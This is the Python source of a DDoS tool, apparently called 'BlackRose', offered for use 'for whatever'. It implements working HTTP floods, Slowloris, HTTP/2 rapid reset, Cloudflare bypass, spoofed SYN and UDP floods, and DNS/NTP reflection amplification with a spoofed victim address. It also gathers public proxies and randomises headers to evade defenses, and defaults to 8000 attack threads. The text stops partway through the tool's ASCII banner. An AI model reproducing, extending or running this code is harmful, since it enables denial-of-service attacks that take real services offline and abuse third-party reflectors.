#Cooked up by a messed up brain!
#Use at your own risk. I don’t care what for.
import os
import sys
import time
import socket
import random
import threading
import queue
import argparse
import ssl
import json
from urllib.parse import urlparse
from collections import deque
from abc import ABC, abstractmethod
from struct import pack as data_pack
from uuid import uuid4
from concurrent.futures import ThreadPoolExecutor
try:
    import requests
    from requests.exceptions import RequestException
    import socks
    from rich.console import Console
    from rich.live import Live
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.align import Align
    from rich.text import Text
    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
    import rich.box as box
    from loguru import logger
    import h2.connection
    import h2.events
    from impacket.ImpactPacket import IP, TCP, UDP
    import cloudscraper
except ImportError:
    print("FATAL ERROR: Required libraries are not installed.")
    print("Please run: pip install requests pysocks rich loguru h2 impacket cloudscraper certifi")
    sys.exit(1)

VERSION = "2.0 Overload Protocol"
STAY_ALIVE = threading.Event()
CONSOLE = Console()
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
DEFAULT_CONFIG_PATH = "config.json"
#default config!
DEFAULT_CONFIG = {
    "target": "https://example.com",
    "duration": 600,
    "threads": 8000,
    "proxies": {
        "proxy_file": "proxies.txt",
        "sources": [
            {"type": "http", "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http", "timeout": 5},
            {"type": "socks4", "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4", "timeout": 5},
            {"type": "socks5", "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5", "timeout": 5}
        ],
        "validate": True,
        "validation_threads": 500,
        "validation_timeout": 5
    },
    "logging": {"level": "INFO", "file": "BlackRose_overload.log"},
    "attack_mix": {
        "HYBRID_ASSAULT": 25,
        "HTTP2_RAPID_RESET": 25,
        "HTTP_GARBAGE_FLOOD": 15,
        "HTTP_SMUGGLING": 10,
        "SPOOF_SYN": 15,
        "UDP_FLOOD": 10,
        "SLOWLORIS": 0,
        "DNS_AMP": 0,
    },
    "plugin_config": {
        "rpc": 200,
        "udp_flood_packet_size": 1472,
        "http_garbage_flood_size": 4096,
        "Slowloris": {"sockets_per_thread": 200, "sleep_time": 5},
        "HTTP2RapidReset": {"streams_per_connection": 1000},
        "amplification": {
            "dns_reflectors": "files/dns.txt",
            "ntp_reflectors": "files/ntp.txt",
            "dns_domains": ["google.com", "cloudflare.com", "bing.com", "wikipedia.org", "yahoo.com", "amazon.com"],
            "warmup_percentage": 0.2,
        },
        "custom_headers_file": "files/headers.txt"
    },
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
]
POST_DATA_CHOICES = [
    "username={}&password={}".format(uuid4().hex[:10], uuid4().hex[:15]),
    "data={}".format(uuid4().hex * 10),
    json.dumps({
        "session_id": str(uuid4()),
        "action": random.choice(["login", "update_profile", "search"]),
        "payload": {"query": uuid4().hex[:20], "nonce": uuid4().hex}
    })
]
CUSTOM_HEADERS = []

def load_custom_headers(filepath):
    """Loads custom headers from a file to be used in L7 attacks."""
    if filepath and os.path.exists(filepath):
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    CUSTOM_HEADERS.append(line)
        if CUSTOM_HEADERS:
            logger.success(f"Loaded {len(CUSTOM_HEADERS)} custom headers for advanced evasion.")

def get_random_headers(target_hostname):
    """Returns a dictionary of randomized headers, making traffic look more legitimate."""
    referer = f"https://{random.choice(['google.com', 'bing.com', 'duckduckgo.com'])}/search?q={target_hostname}"
    base_headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Referer': referer,
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }
    if CUSTOM_HEADERS:
        num_custom = random.randint(1, min(3, len(CUSTOM_HEADERS)))
        for header_line in random.sample(CUSTOM_HEADERS, num_custom):
            key, value = header_line.split(':', 1)
            base_headers[key.strip()] = value.strip()
    return base_headers

def _rand_ip(): return f"{random.randint(1, 254)}.{random.randint(0, 254)}.{random.randint(0, 254)}.{random.randint(1, 254)}"

def create_text_sparkline(data, length=20):
    """Creates a beautiful text-based sparkline graph."""
    if not data: return " " * length
    data = list(data)[-length:]
    ticks = [' ', '▂', '▃', '▄', '▅', '▆', '▇', '█']
    try:
        min_val, max_val = min(data), max(data)
        val_range = (max_val - min_val) or 1
    except (ValueError, TypeError):
        return " " * length
    return "".join(ticks[int(((d - min_val) / val_range) * (len(ticks) - 1))] for d in data).ljust(length)


class GlobalStats:
    """A thread-safe class to manage and calculate global statistics for the attack."""
    def __init__(self):
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.metrics = {"requests": 0, "success": 0, "failed": 0, "bytes_sent": 0, "bytes_impact": 0, "syn_pkts": 0, "amp_pkts": 0, "udp_pkts": 0, "h2_streams": 0, "slowloris_sockets": 0}
        self.ops_data = deque([0]*60, maxlen=60)
        self.bps_sent_data = deque([0]*60, maxlen=60)
        self.bps_impact_data = deque([0]*60, maxlen=60)
        self.last_update_time = time.time()
        self.last_total_ops = 0
        self.last_bytes_sent = 0
        self.last_bytes_impact = 0

    def log(self, **kwargs):
        with self.lock:
            for key, value in kwargs.items():
                if key in self.metrics:
                    self.metrics[key] += value

    def update_telemetry(self):
        with self.lock:
            now = time.time()
            elapsed = now - self.last_update_time
            if elapsed < 1: return
            current_total_ops = sum(v for k, v in self.metrics.items() if 'bytes' not in k and 'sockets' not in k)
            current_bytes_sent, current_bytes_impact = self.metrics['bytes_sent'], self.metrics['bytes_impact']
            ops = (current_total_ops - self.last_total_ops) / elapsed
            bps_sent = (current_bytes_sent - self.last_bytes_sent) / elapsed
            bps_impact = (current_bytes_impact - self.last_bytes_impact) / elapsed
            self.ops_data.append(int(ops)); self.bps_sent_data.append(int(bps_sent)); self.bps_impact_data.append(int(bps_impact))
            self.last_total_ops, self.last_bytes_sent, self.last_bytes_impact, self.last_update_time = current_total_ops, current_bytes_sent, current_bytes_impact, now

    def get_snapshot(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            return {
                "metrics": self.metrics.copy(), "elapsed": elapsed,
                "ops": self.ops_data[-1] if self.ops_data else 0,
                "bps_sent": self.bps_sent_data[-1] if self.bps_sent_data else 0,
                "bps_impact": self.bps_impact_data[-1] if self.bps_impact_data else 0,
                "ops_spark": list(self.ops_data), "bps_sent_spark": list(self.bps_sent_data), "bps_impact_spark": list(self.bps_impact_data),
            }

STATS = GlobalStats()
class ManagedSocket:
    def __init__(self, proxy, target, timeout=10):
        self.proxy, self.target, self.timeout = proxy, target, timeout
        self.sock = self._create_socket()
    def _create_socket(self):
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(self.timeout)
        if self.proxy:
            proxy_type_map = {'socks4': socks.SOCKS4, 'socks5': socks.SOCKS5, 'http': socks.HTTP}
            s.set_proxy(proxy_type_map.get(self.proxy.proxy_type, socks.HTTP), self.proxy.host, self.proxy.port)
        return s
    def connect(self): self.sock.connect((self.target['host'], self.target['port']))
    def wrap_ssl(self):
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        if self.target['scheme'] == 'https': ctx.set_alpn_protocols(['h2', 'http/1.1'])
        return ctx.wrap_socket(self.sock, server_hostname=self.target['hostname'])
    def __enter__(self): return self
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.sock: self.sock.close()
    def __getattr__(self, name): return getattr(self.sock, name)

class BaseAttack(ABC):
    def __init__(self, target, config, stats, proxy_manager, orchestrator):
        self.target, self.config, self.stats, self.proxy_manager, self.orchestrator = target, config, stats, proxy_manager, orchestrator
        self.stay_alive = True
    @abstractmethod
    def execute(self): pass
    def stop(self): self.stay_alive = False

class HTTPSmuggling(BaseAttack):
    def execute(self):
        while self.stay_alive:
            proxy = self.proxy_manager.get_proxy()
            try:
                with ManagedSocket(proxy, self.target) as s:
                    s.connect()
                    sock = s.wrap_ssl() if self.target['scheme'] == 'https' else s.sock
                    for _ in range(self.config['plugin_config']['rpc']):
                        body = random.choice(POST_DATA_CHOICES)
                        chunked_body = f"{hex(len(body))[2:]}\r\n{body}\r\n0\r\n\r\n"
                        headers_dict = get_random_headers(self.target['hostname'])
                        headers_dict['Host'] = self.target['hostname']
                        headers_dict['Transfer-Encoding'] = 'chunked'
                        headers_str = "".join(f"{k}: {v}\r\n" for k, v in headers_dict.items())
                        payload = f"POST {self.target['path'] or '/'}?cb={uuid4()} HTTP/1.1\r\n{headers_str}\r\n{chunked_body}".encode()
                        sock.sendall(payload)
                        self.stats.log(requests=1, success=1, bytes_sent=len(payload), bytes_impact=len(payload) * 2)
            except Exception:
                self.stats.log(requests=1, failed=1); self.proxy_manager.remove_proxy(proxy)

class HTTPGarbageFlood(BaseAttack):
    """Sends POST requests with large, random data payloads to exhaust server resources."""
    def execute(self):
        payload_size = self.config['plugin_config'].get('http_garbage_flood_size', 4096)
        while self.stay_alive:
            proxy = self.proxy_manager.get_proxy()
            try:
                with ManagedSocket(proxy, self.target) as s:
                    s.connect()
                    sock = s.wrap_ssl() if self.target['scheme'] == 'https' else s.sock
                    for _ in range(self.config['plugin_config']['rpc']):
                        post_data = os.urandom(payload_size)
                        headers_dict = get_random_headers(self.target['hostname'])
                        headers_dict['Host'] = self.target['hostname']
                        headers_dict['Content-Type'] = 'application/octet-stream'
                        headers_dict['Content-Length'] = str(len(post_data))
                        headers_str = "".join(f"{k}: {v}\r\n" for k, v in headers_dict.items())
                        payload = f"POST {self.target['path'] or '/'}?cb={uuid4()} HTTP/1.1\r\n{headers_str}\r\n".encode() + post_data
                        sock.sendall(payload)
                        self.stats.log(requests=1, success=1, bytes_sent=len(payload), bytes_impact=len(payload))
            except Exception:
                self.stats.log(requests=1, failed=1); self.proxy_manager.remove_proxy(proxy)

class Slowloris(BaseAttack):
    def execute(self):
        cfg = self.config['plugin_config']['Slowloris']
        sockets = []
        while self.stay_alive:
            try:
                while len(sockets) < cfg['sockets_per_thread'] and self.stay_alive:
                    proxy = self.proxy_manager.get_proxy()
                    try:
                        s = ManagedSocket(proxy, self.target, timeout=4); s.connect()
                        sock = s.wrap_ssl() if self.target['scheme'] == 'https' else s.sock
                        headers_dict = get_random_headers(self.target['hostname']); headers_dict['Host'] = self.target['hostname']
                        headers_str = "".join(f"{k}: {v}\r\n" for k, v in headers_dict.items())
                        header = f"GET {self.target['path'] or '/'}?cb={uuid4()} HTTP/1.1\r\n{headers_str}"
                        sock.send(header.encode()); sockets.append(sock)
                        self.stats.log(slowloris_sockets=1, success=1)
                    except Exception:
                        self.stats.log(failed=1); self.proxy_manager.remove_proxy(proxy)
                for sock in list(sockets):
                    try: sock.send(f"X-a: {uuid4().hex}\r\n".encode())
                    except socket.error:
                        sockets.remove(sock); self.stats.log(slowloris_sockets=-1, failed=1)
                time.sleep(cfg['sleep_time'])
            except Exception: time.sleep(0.1)
        for s in sockets: s.close()

class HTTP2RapidReset(BaseAttack):
    def execute(self):
        headers = [(':method', 'GET'), (':authority', self.target['hostname']), (':scheme', 'https'), (':path', self.target['path'] or f"/?{uuid4()}")]
        streams_count = self.config['plugin_config']['HTTP2RapidReset']['streams_per_connection']
        while self.stay_alive:
            proxy = self.proxy_manager.get_proxy()
            try:
                with ManagedSocket(proxy, self.target, timeout=5) as s:
                    s.connect()
                    tls_sock = s.wrap_ssl()
                    if tls_sock.selected_alpn_protocol() != 'h2':
                        self.stats.log(h2_streams=streams_count, failed=streams_count)
                        self.proxy_manager.remove_proxy(proxy); continue
                    conn = h2.connection.H2Connection(); conn.initiate_connection(); tls_sock.sendall(conn.data_to_send())
                    for i in range(1, streams_count * 2, 2):
                        conn.send_headers(i, headers, end_stream=False)
                        conn.reset_stream(i, error_code=h2.errors.ErrorCodes.CANCEL)
                    data_to_send = conn.data_to_send(); tls_sock.sendall(data_to_send)
                    self.stats.log(h2_streams=streams_count, success=streams_count, bytes_sent=len(data_to_send), bytes_impact=len(data_to_send) * 100)
            except Exception:
                self.stats.log(h2_streams=streams_count, failed=streams_count); self.proxy_manager.remove_proxy(proxy)

class CFBypass(BaseAttack):
    def execute(self):
        scraper = cloudscraper.create_scraper()
        while self.stay_alive:
            proxy = self.proxy_manager.get_proxy()
            proxies = {'http': proxy.as_str(), 'https': proxy.as_str()} if proxy else None
            try:
                res = scraper.get(self.target['full_url'], proxies=proxies, timeout=10, headers=get_random_headers(self.target['hostname']))
                if 200 <= res.status_code < 400: self.stats.log(requests=1, success=1, bytes_sent=len(res.request.body or b''), bytes_impact=len(res.content))
                else: self.stats.log(requests=1, failed=1)
            except Exception:
                self.stats.log(requests=1, failed=1); self.proxy_manager.remove_proxy(proxy)

class HTTPPostFlood(BaseAttack):
    def execute(self):
        while self.stay_alive:
            proxy = self.proxy_manager.get_proxy()
            try:
                with ManagedSocket(proxy, self.target) as s:
                    s.connect()
                    sock = s.wrap_ssl() if self.target['scheme'] == 'https' else s.sock
                    for _ in range(self.config['plugin_config']['rpc']):
                        post_data = random.choice(POST_DATA_CHOICES)
                        headers_dict = get_random_headers(self.target['hostname'])
                        headers_dict['Host'] = self.target['hostname']
                        headers_dict['Content-Type'] = 'application/json' if post_data.startswith('{') else 'application/x-www-form-urlencoded'
                        headers_dict['Content-Length'] = str(len(post_data))
                        headers_str = "".join(f"{k}: {v}\r\n" for k, v in headers_dict.items())
                        payload = f"POST {self.target['path'] or '/'}?cb={uuid4()} HTTP/1.1\r\n{headers_str}\r\n{post_data}".encode()
                        sock.sendall(payload)
                        self.stats.log(requests=1, success=1, bytes_sent=len(payload), bytes_impact=len(payload))
            except Exception:
                self.stats.log(requests=1, failed=1); self.proxy_manager.remove_proxy(proxy)

class HybridAssault(BaseAttack):
    """A devastating hybrid L7 attack that intelligently switches between potent methods."""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        attackers = [HTTPPostFlood, CFBypass, HTTPSmuggling, HTTPGarbageFlood]
        self.attacker = random.choice(attackers)(**kwargs)
    def execute(self): self.attacker.execute()
    def stop(self): self.attacker.stop()

class BaseRawSocketAttack(BaseAttack):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        if self.proxy_manager.has_proxies(): logger.warning(f"{self.__class__.__name__} is a raw socket attack and CANNOT use proxies.")
        try: self.check_privileges()
        except OSError:
            CONSOLE.print(Panel(f"[bold red]FATAL: Attack method '{self.__class__.__name__}' requires Root/Administrator privileges to create raw sockets. This vector has been disabled.", title="[bold yellow]Permission Error[/bold yellow]", border_style="bold red"))
            self.stay_alive = False
    def check_privileges(self):
        if os.name == 'nt':
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin(): raise OSError("Administrator privileges required on Windows.")
        elif os.geteuid() != 0: raise OSError("Root privileges required on Linux/macOS.")

class SPOOFSyn(BaseRawSocketAttack):
    def execute(self):
        if not self.stay_alive: return
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while self.stay_alive:
                try:
                    ip_header = IP(); ip_header.set_ip_src(_rand_ip()); ip_header.set_ip_dst(self.target['host'])
                    tcp_header = TCP(); tcp_header.set_th_sport(random.randint(32768, 65535)); tcp_header.set_th_dport(self.target['port']); tcp_header.set_th_seq(random.randint(1, 2**32-1)); tcp_header.set_SYN()
                    ip_header.contains(tcp_header); packet = ip_header.get_packet()
                    s.sendto(packet, (self.target['host'], 0))
                    self.stats.log(syn_pkts=1, success=1, bytes_sent=len(packet), bytes_impact=len(packet))
                except Exception: self.stats.log(syn_pkts=1, failed=1)

class UDPFlood(BaseRawSocketAttack):
    def execute(self):
        if not self.stay_alive: return
        packet_size = self.config['plugin_config'].get('udp_flood_packet_size', 1472)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while self.stay_alive:
                try:
                    payload = os.urandom(packet_size)
                    s.sendto(payload, (self.target['host'], random.randint(1, 65535)))
                    self.stats.log(udp_pkts=1, success=1, bytes_sent=len(payload), bytes_impact=len(payload))
                except Exception: self.stats.log(udp_pkts=1, failed=1)

class BaseAmplificationAttack(BaseRawSocketAttack):
    PAYLOAD, PROTOCOL_PORT, VECTOR_NAME = b'', 0, "none"
    def execute(self):
        if not self.stay_alive: return
        reflectors = self.orchestrator.get_reflectors(self.VECTOR_NAME)
        if not reflectors: return
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            reflector_cycle = iter(lambda: random.choice(reflectors), None)
            while self.stay_alive:
                try:
                    reflector_ip, amp_factor = next(reflector_cycle)
                    payload, _ = self.get_payload()
                    ip_header = IP(); ip_header.set_ip_src(self.target['host']); ip_header.set_ip_dst(reflector_ip)
                    udp_header = UDP(); udp_header.set_uh_sport(self.target['port']); udp_header.set_uh_dport(self.PROTOCOL_PORT)
                    udp_header.contains(data_pack(f'>{len(payload)}s', payload)); ip_header.contains(udp_header)
                    packet = ip_header.get_packet(); s.sendto(packet, (reflector_ip, self.PROTOCOL_PORT))
                    sent_bytes = len(packet); impact_bytes = int(sent_bytes * amp_factor)
                    self.stats.log(amp_pkts=1, success=1, bytes_sent=sent_bytes, bytes_impact=impact_bytes)
                except StopIteration: reflector_cycle = iter(lambda: random.choice(reflectors), None)
                except Exception: self.stats.log(amp_pkts=1, failed=1)
    def get_payload(self): return self.PAYLOAD, None

class DNS_AMP(BaseAmplificationAttack):
    PROTOCOL_PORT, VECTOR_NAME = 53, "dns"
    def _get_qname(self, domain): return b''.join(data_pack('B', len(label)) + label.encode() for label in domain.split('.')) + b'\x00'
    def get_payload(self):
        domain = random.choice(self.config['plugin_config']['amplification']['dns_domains'])
        return os.urandom(2) + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + self._get_qname(domain) + b'\x00\xff\x00\x01', domain

class NTP_AMP(BaseAmplificationAttack):
    PAYLOAD, PROTOCOL_PORT, VECTOR_NAME = b'\x17\x00\x03\x2a' + (b'\x00' * 4), 123, "ntp"

class Proxy:
    def __init__(self, host, port, proxy_type='http'):
        self.host, self.port, self.proxy_type = host, int(port), proxy_type.lower()
    def as_str(self): return f"{self.proxy_type}://{self.host}:{self.port}"
    def __eq__(self, other): return isinstance(other, Proxy) and self.host == other.host and self.port == other.port and self.proxy_type == other.proxy_type
    def __hash__(self): return hash((self.host, self.port, self.proxy_type))

class AdvancedProxyManager:
    def __init__(self, sources, proxy_file, validate, validation_threads, validation_target, validation_timeout):
        self.sources, self.proxy_file, self.validate = sources, proxy_file, validate
        self.validation_threads, self.validation_target, self.validation_timeout = validation_threads, validation_target, validation_timeout
        self.proxies = queue.Queue(); self.initial_proxies_loaded = False; self._lock = threading.Lock()
    def download_proxies(self):
        downloaded = set(); logger.info(f"Downloading proxies from {len(self.sources)} sources...")
        for source in self.sources:
            try:
                r = requests.get(source['url'], timeout=source['timeout']); r.raise_for_status()
                for line in r.text.splitlines():
                    if ":" in line: host, port = line.strip().split(":"); downloaded.add(Proxy(host, port, source['type']))
            except Exception as e: logger.warning(f"Failed to download proxies from {source['url']}: {e}")
        return downloaded
    def load_from_file(self):
        proxies = set()
        if self.proxy_file and os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    try:
                        if ":" in line:
                            parts = line.strip().split(":"); proxy_type = "http"
                            if "//" in parts[0]: proxy_type, host = parts[0].split("//")
                            else: host = parts[0]
                            if len(parts) > 1: proxies.add(Proxy(host, parts[1], proxy_type))
                    except: continue
        return proxies
    def _validate_proxy(self, proxy, progress, task_id):
        try:
            with ManagedSocket(proxy, self.validation_target, timeout=self.validation_timeout) as s:
                s.connect()
                s.sendall(f"HEAD / HTTP/1.1\r\nHost: {self.validation_target['hostname']}\r\nConnection: close\r\n\r\n".encode())
                s.recv(1024)
            progress.update(task_id, advance=1); return proxy
        except Exception: progress.update(task_id, advance=1); return None
    def load_and_validate(self):
        raw_proxies = self.load_from_file()
        if not raw_proxies: logger.info("Proxy file empty/not found. Downloading..."); raw_proxies.update(self.download_proxies())
        if not raw_proxies: logger.warning("No proxies loaded. Running in direct (non-proxied) mode."); return
        logger.info(f"Loaded {len(raw_proxies)} raw proxies.")
        if self.validate:
            validated_proxies = []
            progress = Progress(TextColumn("[bold cyan]Validating Proxies"), BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TextColumn("({task.completed}/{task.total})"), TimeRemainingColumn(), console=CONSOLE)
            with progress:
                task_id = progress.add_task("validation", total=len(raw_proxies))
                with ThreadPoolExecutor(max_workers=self.validation_threads) as executor:
                    futures = {executor.submit(self._validate_proxy, p, progress, task_id): p for p in raw_proxies}
                    for future in futures:
                        result = future.result()
                        if result: validated_proxies.append(result)
            for p in validated_proxies: self.proxies.put(p)
            if self.proxies.empty(): logger.error("Proxy validation finished, but no live proxies were found. Attack may fail or run in direct mode.")
            else: logger.success(f"Validation complete. {self.proxies.qsize()} live proxies are operational.")
        else:
            for p in raw_proxies: self.proxies.put(p)
            logger.info(f"Proxy validation skipped. {self.proxies.qsize()} proxies loaded.")
        if not self.proxies.empty(): self.initial_proxies_loaded = True
    def get_proxy(self):
        if self.proxies.empty(): return None
        try: proxy = self.proxies.get_nowait(); self.proxies.put(proxy); return proxy
        except queue.Empty: return None
    def remove_proxy(self, proxy_to_remove):
        with self._lock:
            if not proxy_to_remove or not self.initial_proxies_loaded: return
            new_queue = queue.Queue()
            try:
                while not self.proxies.empty():
                    p = self.proxies.get_nowait()
                    if p != proxy_to_remove: new_queue.put_nowait(p)
            except queue.Empty: pass
            finally: self.proxies = new_queue
    def has_proxies(self): return self.initial_proxies_loaded and not self.proxies.empty()

class AttackOrchestrator:
    def __init__(self, config):
        self.config = config; self.stats = STATS
        self.target_info = self._parse_target(config['target'])
        pm_config = self.config['proxies']
        self.proxy_manager = AdvancedProxyManager(sources=pm_config.get('sources', []), proxy_file=pm_config.get('proxy_file'), validate=pm_config.get('validate', True), validation_threads=pm_config.get('validation_threads', 500), validation_timeout=pm_config.get('validation_timeout', 5), validation_target=self.target_info)
        self.thread_pool, self.attack_instances = [], []
        self.reflectors = {"dns": [], "ntp": []}
        self.attack_plugins = {"SPOOF_SYN": SPOOFSyn, "DNS_AMP": DNS_AMP, "NTP_AMP": NTP_AMP, "UDP_FLOOD": UDPFlood, "HTTP2_RAPID_RESET": HTTP2RapidReset, "HYBRID_ASSAULT": HybridAssault, "SLOWLORIS": Slowloris, "HTTP_SMUGGLING": HTTPSmuggling, "HTTP_POST_FLOOD": HTTPPostFlood, "HTTP_GARBAGE_FLOOD": HTTPGarbageFlood}
    def _parse_target(self, target_str):
        if not target_str.startswith(('http://', 'https://')): target_str = 'https://' + target_str
        p = urlparse(target_str)
        try: ip = socket.gethostbyname(p.hostname)
        except socket.gaierror: logger.critical(f"Could not resolve hostname: {p.hostname}. Aborting."); sys.exit(1)
        return {"full_url": target_str, "scheme": p.scheme, "host": ip, "hostname": p.hostname, "port": p.port or (443 if p.scheme == 'https' else 80), "path": p.path}
    def _test_reflector_worker(self, proto, ip, progress, task_id):
        amp_factor = self.measure_amp_factor(proto, ip); progress.update(task_id, advance=1)
        if amp_factor > 1.1: return (proto, (ip, amp_factor))
        return None
    def _load_and_test_reflectors(self):
        amp_config = self.config['plugin_config']['amplification']; all_reflectors_to_test = []
        for proto in self.reflectors.keys():
            filepath = amp_config.get(f"{proto}_reflectors")
            if filepath and os.path.exists(filepath):
                with open(filepath, 'r') as f: all_ips = [line.strip() for line in f if line.strip() and ':' not in line]
                if not all_ips: continue
                logger.info(f"Found {len(all_ips)} potential {proto.upper()} reflectors. Sampling for live test...")
                sample_size = int(len(all_ips) * amp_config.get('warmup_percentage', 0.1))
                if sample_size == 0 and len(all_ips) > 0: sample_size = len(all_ips)
                sample_ips = random.sample(all_ips, min(sample_size, len(all_ips)))
                for ip in sample_ips: all_reflectors_to_test.append((proto, ip))
        if not all_reflectors_to_test: logger.warning("No amplification reflectors found or configured to test."); return
        progress = Progress(TextColumn("[bold yellow]Measuring Amplification"), BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TextColumn("({task.completed}/{task.total})"), TimeRemainingColumn(), console=CONSOLE)
        with progress:
            task_id = progress.add_task("Testing...", total=len(all_reflectors_to_test))
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(self._test_reflector_worker, proto, ip, progress, task_id) for proto, ip in all_reflectors_to_test]
                for future in futures:
                    result = future.result()
                    if result: proto_res, reflector_data = result; self.reflectors[proto_res].append(reflector_data)
        for proto, r_list in self.reflectors.items():
            if r_list: logger.success(f"Validated {len(r_list)} effective {proto.upper()} reflectors.")
    def measure_amp_factor(self, proto, ip):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.settimeout(1)
        try:
            payload_provider = globals()[f"{proto.upper()}_AMP"]
            payload, _ = payload_provider.get_payload(self) if proto == 'dns' else (payload_provider.PAYLOAD, None)
            sent_len = len(payload)
            if sent_len == 0: return 0
            port = payload_provider.PROTOCOL_PORT; sock.sendto(payload, (ip, port)); data, _ = sock.recvfrom(65535)
            return len(data) / sent_len
        except (socket.timeout, ConnectionRefusedError): return 0
        except Exception: return 0
        finally: sock.close()
    def get_reflectors(self, proto_name): return self.reflectors.get(proto_name, [])
    def unleash_vengeance(self):
        logger.info("Preparing Overload Protocol...")
        self.proxy_manager.load_and_validate()
        self._load_and_test_reflectors()
        load_custom_headers(self.config['plugin_config']['custom_headers_file'])
        total_threads = self.config['threads']
        active_vectors = {k: v for k, v in self.config['attack_mix'].items() if v > 0}
        total_weight = sum(active_vectors.values())
        if total_weight == 0: logger.critical("Attack mix is empty. No vectors to run. Aborting."); return
        logger.info(f"Orchestrating Overload: {total_threads:,} threads across {len(active_vectors)} vectors.")
        for name, weight in active_vectors.items():
            if name not in self.attack_plugins: logger.warning(f"Vector '{name}' not found. Skipping."); continue
            num_threads = round(total_threads * (weight / total_weight))
            if num_threads == 0: continue
            logger.info(f"Assigning {num_threads} threads to [bold magenta]{name}[/bold magenta] vector.")
            for _ in range(num_threads):
                instance = self.attack_plugins[name](target=self.target_info, config=self.config, stats=self.stats, proxy_manager=self.proxy_manager, orchestrator=self)
                self.attack_instances.append(instance)
                t = threading.Thread(target=instance.execute, daemon=True); self.thread_pool.append(t)
        logger.success(f"All {len(self.thread_pool):,} threads armed. [bold red]UNLEASHING OVERLOAD...[/bold red]")
        for t in self.thread_pool: t.start()
        try:
            start_time = time.time()
            while time.time() - start_time < self.config['duration'] and not STAY_ALIVE.is_set(): time.sleep(1)
        finally: self.ceasefire()
    def ceasefire(self):
        if not STAY_ALIVE.is_set():
            logger.warning("Ceasefire signal received. Terminating all attack vectors."); STAY_ALIVE.set()
            for instance in self.attack_instances: instance.stop()
            time.sleep(2)

class UIManager:
    def __init__(self, config, orchestrator):
        self.config, self.orchestrator = config, orchestrator
        self.target_info = orchestrator.target_info
        self.layout = self._create_layout()
    def _create_layout(self):
        layout = Layout(name="root")
        layout.split(Layout(name="header", size=18), Layout(name="main", ratio=1), Layout(name="progress", size=3), Layout(size=1, name="footer"))
        layout["main"].split_row(Layout(name="left"), Layout(name="right"))
        return layout
    def _get_header(self):
        banner_text = r"""

 ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██ ▄█▀    ██▀███   ▒█████    ██████ ▓█████ 
▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒    ▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▓█   ▀ 
▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ▒███   
▒██░█▀  ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▒██▀▀█▄  ▒██   ██░  ▒   ██▒▒▓█  ▄ 
░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ░██▓ ▒██▒░ ████▓▒░▒██████▒▒░▒████▒
░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░░ ▒░ ░
